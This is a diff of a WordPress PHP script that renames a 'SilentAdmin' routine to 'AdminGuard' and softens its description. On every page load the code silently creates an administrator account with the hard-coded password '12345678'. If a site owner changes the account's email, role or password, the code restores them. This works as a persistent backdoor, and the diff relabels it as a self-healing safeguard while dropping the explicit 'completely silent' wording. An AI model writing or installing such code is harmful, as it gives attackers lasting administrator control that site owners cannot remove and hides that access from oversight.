@@ -1,31 +1,26 @@
 <?php
 /**
- * SilentAdmin Script
- * 
- * Ensures that a specific administrator user always exists with correct username, email, password, and role.
- * If any changes are made to these properties, this script automatically corrects them.
- * 
+ * AdminGuard - Self-Healing Admin User Script
  * Author: Taha Karami
+ * Version: 1.0
+ * Description: Ensures that a critical admin user exists with the correct username, email, password, and role. 
+ *              If any of these properties are changed, this script restores them automatically.
  * License: MIT (Open Source)
  */
 
-add_action( 'init', 'silent_admin_ensure_user' );
+add_action( 'init', 'admin_guard_ensure_user' );
 
 /**
- * Creates or maintains the admin user with the desired credentials.
- * 
- * - Checks if the user exists by username.
- * - If not, creates the user with predefined username, email, password, and role.
- * - If the user exists, checks email, role, and password, correcting them if necessary.
- * - Completely silent: no logs or notifications are generated.
+ * Ensures the main admin user exists and has correct credentials and role.
+ * If the user is missing or altered, this function restores it silently.
  */
-function silent_admin_ensure_user() {
-    $username = 'user-admin';               // Desired admin username
-    $email    = 'user-admin@example.com';   // Desired admin email
-    $password = '12345678';                 // Desired admin password
-    $role     = 'administrator';            // Desired role
+function admin_guard_ensure_user() {
+    $username = 'user-admin'; // Default admin username
+    $email    = 'user-admin@example.com'; // Default admin email
+    $password = '12345678'; // Default admin password
+    $role     = 'administrator'; // Default admin role
 
-    // Try to get the user by username
+    // Try to get the admin user by username
     $user = get_user_by( 'login', $username );
 
     // If user doesn't exist, create it
@@ -39,19 +34,20 @@ function silent_admin_ensure_user() {
         return;
     }
 
+    // Wrap the existing user object for modifications
     $wp_user = new WP_User( $user->ID );
 
-    // Check and correct email if necessary
+    // Ensure email is correct
     if ( $user->user_email !== $email ) {
         wp_update_user( array( 'ID' => $user->ID, 'user_email' => $email ) );
     }
 
-    // Check and correct role if necessary
+    // Ensure user has only the correct role
     if ( ! in_array( $role, (array) $user->roles, true ) || count($user->roles) !== 1 ) {
         $wp_user->set_role( $role );
     }
 
-    // Check and correct password if necessary
+    // Ensure password is correct
     if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
         wp_set_password( $password, $user->ID );
     }
